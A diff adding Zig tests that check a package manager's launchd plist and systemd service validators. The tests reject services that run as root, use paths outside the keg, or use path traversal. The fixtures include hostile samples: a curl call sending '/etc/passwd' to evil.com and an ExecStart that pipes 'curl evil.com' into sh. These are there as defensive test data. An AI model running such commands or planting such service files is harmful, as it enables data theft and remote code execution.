@@ -14,6 +14,8 @@ const placeholder = @import("platform/placeholder.zig");
 const store = @import("store/store.zig");
 const client = @import("api/client.zig");
 
+const launchd = @import("services/launchd.zig");
+
 // ────────────────────────────────────────────────────────────────────────
 // 1. Path traversal in package names
 // ────────────────────────────────────────────────────────────────────────
@@ -359,4 +361,196 @@ test "isValidSha256 rejects non-hex strings" {
     try testing.expect(!store.isValidSha256("abc"));
     try testing.expect(!store.isValidSha256("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"));
     try testing.expect(store.isValidSha256("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"));
+}
+
+// ────────────────────────────────────────────────────────────────────────
+// 12. Launchd plist content validation
+// ────────────────────────────────────────────────────────────────────────
+
+test "isPlistSafe rejects plist with UserName root" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>UserName</key>
+        \\  <string>root</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/opt/nanobrew/prefix/Cellar/evil/1.0/bin/evil</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe rejects plist with ProgramArguments outside keg" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/usr/bin/curl</string>
+        \\    <string>http://evil.com/steal?data=/etc/passwd</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe rejects plist with ProgramArguments path traversal" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/opt/nanobrew/prefix/Cellar/../../../bin/evil</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe rejects plist with Program key outside keg" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>Program</key>
+        \\  <string>/usr/bin/evil</string>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe rejects plist with Program key path traversal" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.evil</string>
+        \\  <key>Program</key>
+        \\  <string>/opt/nanobrew/prefix/Cellar/../../../bin/evil</string>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe accepts safe plist with Program key inside keg" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.redis</string>
+        \\  <key>Program</key>
+        \\  <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/bin/redis-server</string>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isPlistSafe accepts safe plist with ProgramArguments inside keg" {
+    const plist =
+        \\<?xml version="1.0" encoding="UTF-8"?>
+        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        \\<plist version="1.0">
+        \\<dict>
+        \\  <key>Label</key>
+        \\  <string>homebrew.mxcl.redis</string>
+        \\  <key>ProgramArguments</key>
+        \\  <array>
+        \\    <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/bin/redis-server</string>
+        \\    <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/etc/redis.conf</string>
+        \\  </array>
+        \\</dict>
+        \\</plist>
+    ;
+    try testing.expect(launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
+}
+
+// ────────────────────────────────────────────────────────────────────────
+// 13. systemd service file validation
+// ────────────────────────────────────────────────────────────────────────
+
+const systemd = @import("services/systemd.zig");
+
+test "isServiceFileSafe rejects User=root" {
+    const content =
+        \\[Unit]
+        \\Description=Evil Service
+        \\
+        \\[Service]
+        \\User=root
+        \\ExecStart=/opt/nanobrew/prefix/Cellar/pkg/1.0/bin/mybin
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isServiceFileSafe rejects ExecStart outside keg" {
+    const content =
+        \\[Unit]
+        \\Description=Malicious Service
+        \\
+        \\[Service]
+        \\ExecStart=/bin/bash -c 'curl evil.com|sh'
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isServiceFileSafe rejects ExecStart with path traversal" {
+    const content =
+        \\[Unit]
+        \\Description=Traversal Service
+        \\
+        \\[Service]
+        \\ExecStart=/opt/nanobrew/prefix/Cellar/../../../bin/evil
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
+}
+
+test "isServiceFileSafe accepts safe service file with ExecStart inside keg" {
+    const content =
+        \\[Unit]
+        \\Description=Safe Service
+        \\
+        \\[Service]
+        \\User=_myservice
+        \\ExecStart=/opt/nanobrew/prefix/Cellar/mypkg/1.0/bin/mypkg --config /etc/mypkg.conf
+        \\
+        \\[Install]
+        \\WantedBy=multi-user.target
+    ;
+    try testing.expect(systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
 }
